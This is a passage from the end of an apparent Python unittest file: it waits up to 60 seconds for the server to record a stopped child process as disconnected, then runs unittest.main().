        self.wait_for(lambda: self.row()["state"] == "disconnected",
                      timeout=60.0,
                      what="the server noticing the child was stopped")


if __name__ == "__main__":
    unittest.main()
